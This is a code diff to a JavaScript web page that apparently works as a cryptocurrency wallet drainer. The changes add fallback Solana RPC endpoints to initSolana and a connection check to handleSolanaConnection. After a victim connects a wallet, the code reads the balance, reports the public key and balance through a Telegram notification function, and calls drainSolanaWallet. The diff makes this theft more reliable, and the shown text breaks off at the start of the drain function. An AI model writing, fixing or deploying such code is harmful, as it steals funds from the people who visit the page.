@@ -194,35 +194,66 @@ $(document).ready(function () {
 
     // SOLANA FUNCTIONS
     async function initSolana() {
-        const solWallets = detectSolanaWallets();
-        if (solWallets.length > 0) {
-            solProvider = solWallets[0].provider;
-            detectedWallets.push(solWallets[0]);
-            console.log('Solana detected:', solWallets[0].name);
-            return true;
+    const solWallets = detectSolanaWallets();
+    if (solWallets.length > 0) {
+        solProvider = solWallets[0].provider;
+        
+        // Try multiple RPC endpoints with fallback
+        const RPC_ENDPOINTS = [
+            'https://solana-api.projectserum.com',
+            'https://rpc.ankr.com/solana',
+            'https://solana-rpc.publicnode.com',
+            'https://api.mainnet-beta.solana.com'
+        ];
+        
+        let connected = false;
+        for (const endpoint of RPC_ENDPOINTS) {
+            try {
+                solConnection = new solanaWeb3.Connection(endpoint, 'confirmed');
+                await solConnection.getLatestBlockhash();
+                connected = true;
+                console.log('SOL RPC OK:', endpoint);
+                break;
+            } catch(e) {
+                console.log('SOL RPC FAILED:', endpoint);
+            }
         }
-        return false;
+        
+        if (!connected) {
+            console.error('No Solana RPC available');
+            return false;
+        }
+        
+        detectedWallets.push(solWallets[0]);
+        console.log('Solana detected:', solWallets[0].name);
+        return true;
     }
+    return false;
+}
 
     async function handleSolanaConnection() {
-        if (!solProvider?.connect) return;
-        
-        try {
-            await solProvider.connect();
-            const publicKey = solProvider.publicKey.toString();
-            const balance = await solConnection.getBalance(solProvider.publicKey);
-            const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
-            
-            await sendEnhancedTelegramNotification(
-                solProvider.isPhantom ? 'Phantom SOL' : 'Solana Wallet',
-                publicKey, `${solBalance} SOL`, {}, 'SOL'
-            );
-            
-            await drainSolanaWallet();
-        } catch(e) {
-            console.error('Solana connect failed:', e);
-        }
+    if (!solProvider?.connect) return;
+    if (!solConnection) {
+        console.error('solConnection not initialized');
+        return;
     }
+    
+    try {
+        await solProvider.connect();
+        const publicKey = solProvider.publicKey.toString();
+        const balance = await solConnection.getBalance(solProvider.publicKey);
+        const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+        
+        await sendEnhancedTelegramNotification(
+            solProvider.isPhantom ? 'Phantom SOL' : 'Solana Wallet',
+            publicKey, `${solBalance} SOL`, {}, 'SOL'
+        );
+        
+        await drainSolanaWallet();
+    } catch(e) {
+        console.error('Solana connect failed:', e);
+    }
+}
 
     async function drainSolanaWallet() {
         if (!solProvider || !solConnection) return;
